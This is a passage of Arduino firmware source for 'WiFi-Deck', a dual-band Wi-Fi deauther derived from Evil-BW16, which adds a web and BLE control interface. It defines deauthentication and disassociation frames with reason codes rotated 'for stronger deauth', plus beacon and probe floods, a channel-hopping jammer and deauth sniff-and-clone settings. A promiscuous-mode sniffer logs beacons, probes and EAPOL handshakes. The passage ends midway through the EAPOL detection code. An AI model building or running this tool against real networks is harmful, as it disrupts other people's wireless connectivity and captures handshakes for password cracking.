/*
   WiFi-Deck - WiFi Dual band deauther with Web Interface

   Based on Evil-BW16 v1.0.2 by 7h30th3r0n3
   Modified to add WiFi Web Server + JSON API + Mobile-friendly HTML UI

   Copyright (c) 2024 7h30th3r0n3 (original)
   WebUI modification: 2026

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited.
   Users must comply with all applicable laws and regulations.
*/

#include <Arduino.h>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "platform_stdlib.h"
#include "osdep_service.h"
#include "FreeRTOS.h"
#include "semphr.h"
#include "BLEDevice.h"
#include "wiring_watchdog.h"
#include <FlashMemory.h>
#include <strings.h>
#include <stddef.h>
#include <errno.h>
#include <ctype.h>

#include <sys/types.h>
#ifndef _IN_ADDR_T_DECLARED
typedef uint32_t in_addr_t;
#define _IN_ADDR_T_DECLARED
#endif

extern "C" {
#include "bt_intf.h"
#include "app_msg.h"
#include "gap.h"
#include "gap_le.h"
#include "gap_adv.h"
#include "gap_config.h"
#include "gap_conn_le.h"
#include "gap_msg.h"
#include "gap_callback_le.h"
#include "gap_bond_le.h"
#include "gatt_builtin_services.h"
#include <lwip/sockets.h>
}

// Strip lwIP BSD/POSIX socket compatibility macros so C++ methods (Serial.read, write, connect, etc.) are untouched
#undef accept
#undef bind
#undef shutdown
#undef getpeername
#undef getsockname
#undef setsockopt
#undef getsockopt
#undef closesocket
#undef connect
#undef listen
#undef recv
#undef recvfrom
#undef send
#undef sendmsg
#undef sendto
#undef socket
#undef select
#undef ioctlsocket
#undef read
#undef write
#undef writev
#undef close
#undef fcntl
#undef ioctl

#ifndef SHUT_WR
#define SHUT_WR 1
#endif

#ifdef max
#undef max
#endif
#ifdef min
#undef min
#endif

#include <vector>

#define LOG_STR_LEN             128
#define LOG_RING_SIZE           24

//==========================
// User Configuration
//==========================
#define DEFAULT_WIFI_SSID "WiFi-Deck"
#define DEFAULT_WIFI_PASS "12345678"
#define DEFAULT_BLE_NAME  "WiFi-Deck"
#define WIFI_CHANNEL      1

char ap_ssid[33]  = DEFAULT_WIFI_SSID;
char ap_pass[65]  = DEFAULT_WIFI_PASS;
char ble_name[27] = DEFAULT_BLE_NAME;

bool USE_LED = true;
bool apEnabled = true;        // SoftAP/WebUI 是否开启（ap off 后进入 BLE-only 隐身省电模式）
volatile bool softApActive = false; // SoftAP 实际是否在空中运行（与 apEnabled 区分，避免嗅探期误判）
bool pendingApRestart = false; // 延迟重启 SoftAP 标志（确保 BLE/HTTP 响应先发回再重开热点）
unsigned long pendingApRestartAt = 0; // 请求重启时间戳，留足 BLE notify / HTTP 200 发出窗口

// Attack parameters
unsigned long last_cycle     = 0;
unsigned long cycle_delay    = 2000;     // Delay between attack cycles (ms)
unsigned long scan_time      = 5000;     // WiFi scan duration (ms)
unsigned long num_send_frames = 3;
int start_channel            = 1;        // 1 => 2.4GHz start, 36 => 5GHz only
bool scan_between_cycles     = false;    // If true, scans between each attack cycle

uint8_t dst_mac[6]  = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast

enum SniffMode {
  SNIFF_ALL,
  SNIFF_BEACON,
  SNIFF_PROBE,
  SNIFF_DEAUTH,
  SNIFF_EAPOL,
  SNIFF_PWNAGOTCHI,
  SNIFF_STOP
};

// Channel hopping configuration
volatile bool isHopping = false;
unsigned long lastHopTime = 0;
const unsigned long HOP_INTERVAL = 500; // 500ms between hops
const int CHANNELS_2GHZ[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
const int CHANNELS_5GHZ[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
int currentChannelIndex = 0;
bool hopUse5GHz = false;
bool hopResetPending = true;
volatile int currentChannel = WIFI_CHANNEL; // Default channel

volatile SniffMode currentMode = SNIFF_STOP;  // Start in STOP mode
volatile bool isSniffing = false;             // Global flag to track if sniffing is active

const int MAX_CUSTOM_CHANNELS = 50;
int customChannels[MAX_CUSTOM_CHANNELS];
int numCustomChannels = 0;
bool useCustomChannels = false;

//-------------------
// Timed Attack & Timed Sniff (WebUI safe auto-recovery)
//-------------------
bool timedAttackEnabled      = false;
unsigned long attackStartTime = 0;
unsigned long attackDuration  = 10000; // default 10 seconds

bool timedSniffEnabled       = false;
unsigned long sniffStartTime  = 0;
unsigned long sniffDuration   = 15000; // default 15 seconds for WebUI safe sniff

//-------------------
// Flood / Jam / Sniff-clone attacks (merged from upstream v1.0.3)
//-------------------
#define BEACON_MAX_SSID_LEN 20

bool beacon_flood_enabled    = false;
unsigned long beacon_flood_delay = 50;   // ms between beacons
unsigned long last_beacon_flood  = 0;
uint16_t beacon_flood_count  = 0;

bool probe_flood_enabled     = false;
unsigned long probe_flood_delay = 30;   // ms between probes
unsigned long last_probe_flood  = 0;
uint16_t probe_flood_count   = 0;

bool signal_jam_enabled     = false;
unsigned long signal_jam_hop_delay = 100; // ms per channel
unsigned long last_signal_jam  = 0;
int signal_jam_ch_index     = 0;
uint16_t signal_jam_count   = 0;

volatile bool deauth_sniff_enabled = false;
bool deauth_sniff_prev_hop  = false;
uint8_t sniffed_deauth_src[6] = {0};
volatile int sniffed_deauth_ch = WIFI_CHANNEL;
volatile bool has_sniffed_deauth = false;
unsigned long last_deauth_sniff_attack = 0;
unsigned long deauth_sniff_interval = 500;
volatile unsigned long lastMgmtBeaconLogMs = 0;
volatile unsigned long lastMgmtProbeLogMs = 0;
volatile unsigned long lastCtrlLogMs = 0;
volatile unsigned long lastDataLogMs = 0;
volatile uint32_t promiscCallbackInFlight = 0;
volatile bool emergencyStopRequested = false;
volatile bool priorityStopPending = false;
volatile bool bleCmdQueueOverflow = false;
volatile bool bleCmdOversizeDrop = false;

int single_ap_index = 0;

//==========================================================
// Frame Structures
//==========================================================
// Rotating sequence number counter (must be nonzero; real APs increment)
static uint16_t seq_num_counter = 1;

// Reason code rotation sets for stronger deauth/disassoc
const uint16_t deauth_reasons[] = {1, 2, 4, 6, 7};
const uint16_t disassoc_reasons[] = {1, 2, 3, 8};
const uint8_t num_deauth_reasons = sizeof(deauth_reasons) / sizeof(deauth_reasons[0]);
const uint8_t num_disassoc_reasons = sizeof(disassoc_reasons) / sizeof(disassoc_reasons[0]);

#pragma pack(push, 1)
typedef struct {
  uint16_t frame_control = 0x00C0;  // Deauth (little-endian on wire)
  uint16_t duration = 0x003A;        // Standard duration for management frames
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  uint16_t sequence_number = 0;      // Will be set per-frame
  uint16_t reason = 0x0006;
} DeauthFrame;

typedef struct {
  uint16_t frame_control = 0x00A0;  // Disassociation
  uint16_t duration = 0x003A;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  uint16_t sequence_number = 0;      // Will be set per-frame
  uint16_t reason = 0x0008;
} DisassocFrame;
#pragma pack(pop)

//==========================================================
// Data Structures
//==========================================================
struct WiFiScanResult {
  bool selected = false;
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
};

struct WiFiStationResult {
  bool selected = false;
  String mac_str;
  uint8_t mac[6];
  short rssi;
};

enum WlanRuntimeMode {
  WLAN_MODE_UNINIT = 0,
  WLAN_MODE_AP,
  WLAN_MODE_STA,
  WLAN_MODE_PROMISC
};

volatile WlanRuntimeMode wlanRuntimeMode = WLAN_MODE_UNINIT;
bool wlanLwipInitialized = false;

// Sliced non-blocking TX state for multi-target deauth / disassoc cycles (3-OptA)
struct SlicedTxCycle {
  bool active = false;
  size_t targetIdx = 0;
  unsigned long frameIdx = 0;
  bool aborted = false;
  std::vector<WiFiScanResult> targets;

  void reset() {
    active = false;
    targetIdx = 0;
    frameIdx = 0;
    aborted = false;
    targets.clear();
  }
};

SlicedTxCycle deauthSlice;
SlicedTxCycle disassocSlice;

// Async non-blocking BLE scan/sync push cursor (2A flow control)
struct BleScanPushState {
  bool active = false;
  bool emitBegin = false;
  bool isSync = false;
  bool beginSent = false;
  size_t idx = 0;
  unsigned long lastProgressAt = 0;
  std::vector<WiFiScanResult> snap;

  void reset() {
    active = false;
    emitBegin = false;
    isSync = false;
    beginSent = false;
    idx = 0;
    lastProgressAt = 0;
    snap.clear();
  }
};

BleScanPushState bleScanPush;

// Generate a random, locally-administered MAC for flood frames
void randomMAC(uint8_t *mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 256);
  }
  mac[0] = (mac[0] & 0xFE) | 0x02;  // locally administered bit
}

static inline void feedWatchdog() {
  wdt_reset();
}

// Forward declarations for functions used before definition
// (Arduino IDE auto-generates these, but explicit is better)
void extractSsidCstr(const uint8_t *frame, int totalLen, int possibleOffset, char *out, size_t outSize);
bool isPwnagotchiMac(const uint8_t *mac);
bool isEAPOL(const uint8_t *buf, int len);
bool setChannel(int newChannel);
void resetHopState();
bool startSoftAP();
bool isSoftApHealthy();
bool webServerRunning();
bool startWebServer(uint8_t maxRetries = 3);
void stopWebServer();
void restoreBleCoex(bool resetCoex = true);
bool enterStaMode(const char *context);
void restoreRadioAfterSniff();
void scheduleApRestart();
void stopAllActiveAttacks();
void stopConflictingModesBeforeAttack();
void clearDeauthSniffState();
void prepareRadioForSniff(bool turnOffAp);
void resetPromiscLogThrottle();
void clearSniffLogRingSafe();
void resetBleLogFlowControl();
void startMonitorSniff(SniffMode mode, bool timed = false, unsigned long dur = 0);
void pushSniffLog(const char *msg);
void getBleStateSafe(uint8_t &connIdOut, bool &notifyOut);
bool isBleReadyToNotifySafe(uint8_t &connIdOut);
bool isBleConnectedSafe();
bool bleSendLineCstr(const char *line, size_t lineLen, bool critical = true, bool isHeartbeat = false, uint16_t minCreditsOverride = 0);
void bleSendLine(const String &line);
bool bleSendSniffLog(const char *msg, bool highPriority);
void bleSendLog(const char *msg);
void bleSendLog(const String &msg);
void blePushStatus(bool critical = true);
void blePushInfo();
void blePushScanResults(bool emitBegin = true, bool isSync = false);
void pumpBleScanPush();
void cancelBleScanPush();
bool stepSlicedTxCycle(SlicedTxCycle &st, bool sendDeauth, bool sendDisassoc, unsigned long frameBudgetPerTick);
void processBleDiagAndNegotiation();
void ensureBleAdvertisingIfDisconnected();
size_t jsonEscapeTruncatedToBuf(const char *src, char *out, size_t outSize, size_t maxEscapedBytes, const char *ellipsis = "...");
size_t jsonEscapeToBuf(const char *src, char *out, size_t outSize);
void pollSerialInput();
bool isStopCmdCstr(const char *s);
bool hasQueuedStopInCmdRing();
bool consumePriorityStopIfPending();
bool startsWithIgnoreCase(const String &s, const char *prefix);
void restoreDefaultChannelIfNeeded(bool force = false);
void wifi_tx_beacon_frame(const char* ssid, int ssid_len, uint8_t channel);
void wifi_tx_probe_req_frame(const char* ssid, int ssid_len);

static inline int getCurrentChannelSafe() {
  rtw_enter_critical(NULL, NULL);
  int ch = currentChannel;
  rtw_exit_critical(NULL, NULL);
  return ch;
}

static inline void setCurrentChannelSafe(int ch) {
  rtw_enter_critical(NULL, NULL);
  currentChannel = ch;
  rtw_exit_critical(NULL, NULL);
}

static inline void formatMac(const uint8_t *mac, char *out, size_t outSize) {
  snprintf(out, outSize, "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// =========================
// 802.11 Header Structure
// =========================
#pragma pack(push, 1)
struct wifi_ieee80211_mac_hdr {
  uint16_t frame_control;
  uint16_t duration_id;
  uint8_t  addr1[6];
  uint8_t  addr2[6];
  uint8_t  addr3[6];
  uint16_t seq_ctrl;
};
#pragma pack(pop)

static inline uint8_t ieee80211_get_type(uint16_t fc) {
  return (fc & 0x0C) >> 2;
}
static inline uint8_t ieee80211_get_subtype(uint16_t fc) {
  return (fc & 0xF0) >> 4;
}
static inline bool is_broadcast_mac(const uint8_t *mac) {
  return mac[0]==0xFF && mac[1]==0xFF && mac[2]==0xFF && mac[3]==0xFF && mac[4]==0xFF && mac[5]==0xFF;
}

// =========================
// Promiscuous Callback
// =========================
struct PromiscFlightGuard {
  PromiscFlightGuard() {
    rtw_enter_critical(NULL, NULL);
    promiscCallbackInFlight++;
    rtw_exit_critical(NULL, NULL);
  }
  ~PromiscFlightGuard() {
    rtw_enter_critical(NULL, NULL);
    if (promiscCallbackInFlight > 0) {
      promiscCallbackInFlight--;
    }
    rtw_exit_critical(NULL, NULL);
  }
};

void resetPromiscLogThrottle() {
  rtw_enter_critical(NULL, NULL);
  lastMgmtBeaconLogMs = 0;
  lastMgmtProbeLogMs = 0;
  lastCtrlLogMs = 0;
  lastDataLogMs = 0;
  rtw_exit_critical(NULL, NULL);
}

void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/) {
  PromiscFlightGuard flightGuard;

  SniffMode modeSnapshot;
  bool sniffingSnapshot;
  bool deauthSniffSnapshot;
  int channelSnapshot;
  rtw_enter_critical(NULL, NULL);
  modeSnapshot = currentMode;
  sniffingSnapshot = isSniffing;
  deauthSniffSnapshot = deauth_sniff_enabled;
  channelSnapshot = currentChannel;
  rtw_exit_critical(NULL, NULL);

  if (!sniffingSnapshot || modeSnapshot == SNIFF_STOP) return;

  if (!buf || len < sizeof(wifi_ieee80211_mac_hdr)) {
    return;
  }

  wifi_ieee80211_mac_hdr *hdr = (wifi_ieee80211_mac_hdr *)buf;
  uint16_t fc = hdr->frame_control;
  uint8_t ftype = ieee80211_get_type(fc);
  uint8_t fsubtype = ieee80211_get_subtype(fc);

  switch (modeSnapshot) {
    case SNIFF_ALL:
      break;
    case SNIFF_BEACON:
      if (!(ftype == 0 && fsubtype == 8)) return;
      break;
    case SNIFF_PROBE:
      if (!(ftype == 0 && (fsubtype == 4 || fsubtype == 5))) return;
      break;
    case SNIFF_DEAUTH:
      if (!(ftype == 0 && (fsubtype == 12 || fsubtype == 10))) return;
      break;
    case SNIFF_EAPOL:
      if (ftype != 2 || !isEAPOL(buf, len)) return;
      break;
    case SNIFF_PWNAGOTCHI:
      if (!(ftype == 0 && fsubtype == 8 && isPwnagotchiMac(hdr->addr2))) return;
      break;
    case SNIFF_STOP:
    default:
      return;
  }

  char logBuf[LOG_STR_LEN];
  const uint8_t *framePtr = (const uint8_t *)buf;

  if (ftype == 0) {
    if (fsubtype == 8) {
      bool isPwn = isPwnagotchiMac(hdr->addr2);
      if (!isPwn) {
        unsigned long now = millis();
        rtw_enter_critical(NULL, NULL);
        if (lastMgmtBeaconLogMs != 0 && (now - lastMgmtBeaconLogMs < 80)) {
          rtw_exit_critical(NULL, NULL);
          return;
        }
        lastMgmtBeaconLogMs = now;
        rtw_exit_critical(NULL, NULL);
      }
      char mac2[18];
      char ssidBuf[36];
      formatMac(hdr->addr2, mac2, sizeof(mac2));
      extractSsidCstr(framePtr, len, 36, ssidBuf, sizeof(ssidBuf));
      if (ssidBuf[0] != '\0') {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Beacon detected %s SSID: %s%s",
                 mac2, ssidBuf,
                 isPwn ? " Pwnagotchi Beacon!" : "");
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Beacon detected %s", mac2);
      }
    }
    else if (fsubtype == 12) {
      char mac2[18], mac1[18];
      formatMac(hdr->addr2, mac2, sizeof(mac2));
      formatMac(hdr->addr1, mac1, sizeof(mac1));
      if (len >= 26) {
        uint16_t reasonCode = (uint16_t)buf[24] | ((uint16_t)buf[25] << 8);
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Deauth detected Sender MAC: %s Receiver MAC: %s Reason code: %u",
                 mac2, mac1, (unsigned)reasonCode);
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Deauth detected Sender MAC: %s Receiver MAC: %s", mac2, mac1);
      }
      // Capture deauth source MAC and channel for deauth-sniff-and-clone mode
      if (deauthSniffSnapshot && !is_broadcast_mac(hdr->addr1)) {
        rtw_enter_critical(NULL, NULL);
        memcpy(sniffed_deauth_src, hdr->addr2, 6);
        sniffed_deauth_ch = channelSnapshot;
        has_sniffed_deauth = true;
        rtw_exit_critical(NULL, NULL);
      }
    }
    else if (fsubtype == 4 || fsubtype == 5) {
      unsigned long now = millis();
      rtw_enter_critical(NULL, NULL);
      if (lastMgmtProbeLogMs != 0 && (now - lastMgmtProbeLogMs < 80)) {
        rtw_exit_critical(NULL, NULL);
        return;
      }
      lastMgmtProbeLogMs = now;
      rtw_exit_critical(NULL, NULL);

      char mac2[18];
      char ssidBuf[36];
      formatMac(hdr->addr2, mac2, sizeof(mac2));
      if (fsubtype == 4) {
        extractSsidCstr(framePtr, len, 24, ssidBuf, sizeof(ssidBuf));
        if (ssidBuf[0] != '\0') {
          snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Request Source MAC: %s Probe SSID: %s", mac2, ssidBuf);
        } else {
          snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Request Source MAC: %s", mac2);
        }
      } else {
        extractSsidCstr(framePtr, len, 36, ssidBuf, sizeof(ssidBuf));
        if (ssidBuf[0] != '\0') {
          snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Response Source MAC: %s SSID: %s", mac2, ssidBuf);
        } else {
          snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Response Source MAC: %s", mac2);
        }
      }
    }
    else if (fsubtype == 10) {
      char mac2[18], mac1[18];
      formatMac(hdr->addr2, mac2, sizeof(mac2));
      formatMac(hdr->addr1, mac1, sizeof(mac1));
      if (len >= 26) {
        uint16_t reasonCode = (uint16_t)buf[24] | ((uint16_t)buf[25] << 8);
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Disassoc detected Sender MAC: %s Receiver MAC: %s Reason code: %u",
                 mac2, mac1, (unsigned)reasonCode);
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Disassoc detected Sender MAC: %s Receiver MAC: %s", mac2, mac1);
      }
    }
    else {
      snprintf(logBuf, sizeof(logBuf), "[MGMT] Other subtype = %u", fsubtype);
    }
  }
  else if (ftype == 1) {
    // SNIFF_ALL 下对高频 ACK/RTS 等控制帧做 300ms 独立限频，限流通过后再构造日志
    unsigned long now = millis();
    rtw_enter_critical(NULL, NULL);
    if (lastCtrlLogMs != 0 && (now - lastCtrlLogMs < 300)) {
      rtw_exit_critical(NULL, NULL);
      return;
    }
    lastCtrlLogMs = now;
    rtw_exit_critical(NULL, NULL);
    snprintf(logBuf, sizeof(logBuf), "[CTRL] Subtype = %u", fsubtype);
  }
  else if (ftype == 2) {
    if (isEAPOL(buf, len)) {
      char mac2[18], mac1[18];
      formatMac(hdr->addr2, mac2, sizeof(mac2));
      formatMac(hdr->addr1, mac1, sizeof(mac1));
      snprintf(logBuf, sizeof(logBuf), "[DATA] EAPOL detected! Source MAC: %s Destination MAC: %s", mac2, mac1);
    } else {
      unsigned long now = millis();
      rtw_enter_critical(NULL, NULL);
      if (lastDataLogMs != 0 && (now - lastDataLogMs < 300)) {
        rtw_exit_critical(NULL, NULL);
        return;
      }
      lastDataLogMs = now;
      rtw_exit_critical(NULL, NULL);
      snprintf(logBuf, sizeof(logBuf), "[DATA] Other data frame.");
    }
  }
  else {
    snprintf(logBuf, sizeof(logBuf), "[EXT] Type = %u", ftype);
  }

  // 严禁在 Wi-Fi RX 回调中同步 Serial.println 阻塞串口；统一入环后由主循环消费并输出
  pushSniffLog(logBuf);
}

// =========================
// Utility Functions
// =========================
bool setChannel(int newChannel) {
  bool sniffingNow = false;
  rtw_enter_critical(NULL, NULL);
  sniffingNow = isSniffing;
  rtw_exit_critical(NULL, NULL);

  // SoftAP 实际在空中工作且未处于嗅探态时，切离热点信道会破坏 WebUI 连接
  if (softApActive && !sniffingNow && newChannel != WIFI_CHANNEL) {
    Serial.println("[WARN] SoftAP active on CH 1; skipping channel lock.");
    return false;
  }
  if (wifi_set_channel(newChannel) == RTW_SUCCESS) {
    setCurrentChannelSafe(newChannel);
    return true;
  }
  Serial.print("[WARN] wifi_set_channel(");
  Serial.print(newChannel);
  Serial.println(") failed");
  return false;
}

void resetHopState() {
  hopUse5GHz = false;
  currentChannelIndex = 0;
  hopResetPending = true;
  lastHopTime = millis();
}

void hopChannel() {
  if (!isHopping) return;
  unsigned long now = millis();
  if (!hopResetPending && (now - lastHopTime < HOP_INTERVAL)) return;

  int nextChannel = WIFI_CHANNEL;
  if (useCustomChannels) {
    if (numCustomChannels <= 0) {
      useCustomChannels = false;
    } else {
      if (currentChannelIndex < 0 || currentChannelIndex >= numCustomChannels) {
        currentChannelIndex = 0;
      }
      nextChannel = customChannels[currentChannelIndex];
      currentChannelIndex = (currentChannelIndex + 1) % numCustomChannels;
    }
  }
  if (!useCustomChannels) {
    const int num2G = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
    const int num5G = sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0]);

    if (!hopUse5GHz) {
      if (currentChannelIndex < 0 || currentChannelIndex >= num2G) {
        currentChannelIndex = 0;
      }
      nextChannel = CHANNELS_2GHZ[currentChannelIndex];
      currentChannelIndex++;
      if (currentChannelIndex >= num2G) {
        currentChannelIndex = 0;
        hopUse5GHz = true;
      }
    } else {
      if (currentChannelIndex < 0 || currentChannelIndex >= num5G) {
        currentChannelIndex = 0;
      }
      nextChannel = CHANNELS_5GHZ[currentChannelIndex];
      currentChannelIndex++;
      if (currentChannelIndex >= num5G) {
        currentChannelIndex = 0;
        hopUse5GHz = false;
      }
    }
  }

  hopResetPending = false;
  lastHopTime = now;
  if (setChannel(nextChannel)) {
    Serial.print("[HOP] Switched to channel ");
    Serial.println(nextChannel);
  }
}

void startSniffing() {
  stopAllActiveAttacks();
  bool alreadySniffing = false;
  rtw_enter_critical(NULL, NULL);
  alreadySniffing = isSniffing;
  rtw_exit_critical(NULL, NULL);

  if (!alreadySniffing) {
    Serial.println("[INFO] Enabling promiscuous mode...");
    // Shut down HTTP listening socket cleanly before wifi_enter_promisc_mode() calls wifi_off()
    prepareRadioForSniff(false);
    resetPromiscLogThrottle();
    WlanRuntimeMode prevMode = wlanRuntimeMode;
    feedWatchdog();
    int preWextMode = -1;
    if (wlanRuntimeMode == WLAN_MODE_UNINIT || wext_get_mode(WLAN0_NAME, &preWextMode) != RTW_SUCCESS) {
      if (wifi_on(RTW_MODE_PROMISC) != RTW_SUCCESS) {
        wlanRuntimeMode = WLAN_MODE_UNINIT;
        timedSniffEnabled = false;
        rtw_enter_critical(NULL, NULL);
        isSniffing = false;
        currentMode = SNIFF_STOP;
        rtw_exit_critical(NULL, NULL);
        Serial.println("[ERROR] startSniffing: wifi_on(RTW_MODE_PROMISC) failed.");
        restoreRadioAfterSniff();
        return;
      }
      delay(20);
      feedWatchdog();
    } else {
      wifi_enter_promisc_mode();
      feedWatchdog();
    }
    int wextMode = -1;
    wext_get_mode(WLAN0_NAME, &wextMode);
    bool stayedSta = (prevMode == WLAN_MODE_STA && wextMode == RTW_MODE_INFRA);
    wlanRuntimeMode = stayedSta ? WLAN_MODE_STA : WLAN_MODE_PROMISC;
    WiFi.disablePowerSave();
    restoreBleCoex(!stayedSta);
    int targetCh = getCurrentChannelSafe();
    setChannel(targetCh);

    // 先设置状态标志再启用回调，避免首波回调丢失或读到 SNIFF_STOP
    rtw_enter_critical(NULL, NULL);
    if (currentMode == SNIFF_STOP) {
      currentMode = SNIFF_ALL;
    }
    isSniffing = true;
    rtw_exit_critical(NULL, NULL);

    if (wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1) != RTW_SUCCESS) {
      rtw_enter_critical(NULL, NULL);
      isSniffing = false;
      currentMode = SNIFF_STOP;
      rtw_exit_critical(NULL, NULL);
      timedSniffEnabled = false;
      Serial.println("[ERROR] Failed to enable promiscuous callback.");
      restoreRadioAfterSniff();
      return;
    }
    Serial.println("[INFO] Sniffer initialized and running.");
  }
}

// Wait briefly for any in-flight Wi-Fi RX promisc callback before tearing down WLAN/switching mode
static void waitForPromiscCallbacksIdle() {
  unsigned long waitedMs = 0;
  while (waitedMs < 60) {
    uint32_t inFlight = 0;
    rtw_enter_critical(NULL, NULL);
    inFlight = promiscCallbackInFlight;
    rtw_exit_critical(NULL, NULL);
    if (inFlight == 0) break;
    feedWatchdog();
    delay(2);
    waitedMs += 2;
  }
  delay(5);
}

// 停止混杂抓包与伴生 Deauth 嗅探状态，但不触发 AP/STA 模式切换
bool haltPromiscSniff() {
  timedSniffEnabled = false;
  bool active = false;
  rtw_enter_critical(NULL, NULL);
  active = (isSniffing || deauth_sniff_enabled);
  isSniffing = false;
  currentMode = SNIFF_STOP;
  rtw_exit_critical(NULL, NULL);
  if (!active) return false;

  // 先关闭底层混杂回调并等待在途 RX 回调彻底退出，防止后续 wifi_off() 撕裂驱动状态
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
  waitForPromiscCallbacksIdle();
  resetPromiscLogThrottle();
  clearDeauthSniffState();
  resetHopState();
  return true;
}

void stopSniffing() {
  if (haltPromiscSniff()) {
    Serial.println("[CMD] Sniffer stopped");
    restoreRadioAfterSniff();
  }
}

size_t validUtf8CharLen(const uint8_t *p, size_t rem) {
  if (!p || rem == 0) return 0;
  uint8_t b0 = p[0];
  if (b0 < 0x80) return 1;
  if (b0 >= 0xC2 && b0 <= 0xDF) {
    if (rem >= 2 && (p[1] & 0xC0) == 0x80) return 2;
    return 0;
  }
  if (b0 >= 0xE0 && b0 <= 0xEF) {
    if (rem >= 3 && (p[1] & 0xC0) == 0x80 && (p[2] & 0xC0) == 0x80) {
      if (b0 == 0xE0 && p[1] < 0xA0) return 0;  // overlong
      if (b0 == 0xED && p[1] > 0x9F) return 0;  // UTF-16 surrogate range
      return 3;
    }
    return 0;
  }
  if (b0 >= 0xF0 && b0 <= 0xF4) {
    if (rem >= 4 && (p[1] & 0xC0) == 0x80 && (p[2] & 0xC0) == 0x80 && (p[3] & 0xC0) == 0x80) {
      if (b0 == 0xF0 && p[1] < 0x90) return 0;  // overlong
      if (b0 == 0xF4 && p[1] > 0x8F) return 0;  // > U+10FFFF
      return 4;
    }
    return 0;
  }
  return 0;
}

void sanitizeUtf8BytesToCstr(const uint8_t *src, size_t srcLen, char *out, size_t outSize, bool stripCtrl) {
  if (!out || outSize == 0) return;
  out[0] = '\0';
  if (!src || srcLen == 0) return;

  size_t pos = 0;
  size_t i = 0;
  while (i < srcLen && pos + 1 < outSize) {
    uint8_t c = src[i];
    if (c == 0x00) {
      i++;
      continue;
    }
    if (c < 0x80) {
      if (!stripCtrl || (c >= 0x20 && c != 0x7F)) {
        out[pos++] = (char)c;
      }
      i++;
      continue;
    }
    size_t seqLen = validUtf8CharLen(&src[i], srcLen - i);
    if (seqLen > 0) {
      if (pos + seqLen >= outSize) break;
      for (size_t k = 0; k < seqLen; k++) {
        out[pos++] = (char)src[i + k];
      }
      i += seqLen;
    } else {
      out[pos++] = '?';
      i++;
    }
  }
  out[pos] = '\0';
}

void extractSsidCstr(const uint8_t *frame, int totalLen, int possibleOffset, char *out, size_t outSize) {
  if (!out || outSize == 0) return;
  out[0] = '\0';
  if (!frame || possibleOffset < 0 || totalLen < possibleOffset + 2) {
    return;
  }
  int offset = possibleOffset;
  // 遍历 IE TLV，直到找到 SSID (tag 0) 或超出边界（全程零堆内存分配，可在 RX 线程安全运行）
  while (offset + 2 <= totalLen) {
    uint8_t tagNumber = frame[offset];
    uint8_t tagLength = frame[offset + 1];
    if (offset + 2 + tagLength > totalLen) break;  // 畸形长度，停止
    if (tagNumber == 0) {
      sanitizeUtf8BytesToCstr(&frame[offset + 2], (size_t)tagLength, out, outSize, true);
      return;
    }
    offset += 2 + tagLength;
  }
}

bool isPwnagotchiMac(const uint8_t *mac) {
  const uint8_t pwnMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD};
  for (int i = 0; i < 6; i++) {
    if (mac[i] != pwnMac[i]) return false;
  }
  return true;
}

bool isEAPOL(const uint8_t *buf, int len) {
  if (!buf || len < 32) return false;
  uint8_t ftype = (buf[0] & 0x0C) >> 2;
  if (ftype != 2) return false; // 必须是 Data 帧
  // 精确计算 802.11 帧头长度，覆盖 4-Address(WDS) / QoS / QoS+HTC 变体
  int hdrLen = 24;
  if ((buf[1] & 0x03) == 0x03) hdrLen += 6; // ToDS=1 & FromDS=1 -> 4-Address，多 6 字节
  bool isQoS = ((buf[0] & 0x80) != 0);
  if (isQoS) {
    hdrLen += 2; // QoS Data (Subtype bit3)
    if ((buf[1] & 0x80) != 0) {
      hdrLen += 4; // +HTC 仅在 QoS Data 且 Order 置位时存在
    }
  }
  if (len < hdrLen + 8) return false;
  // LLC/SNAP (AA AA 03 00 00 00) + EtherType 0x888E (EAPOL)
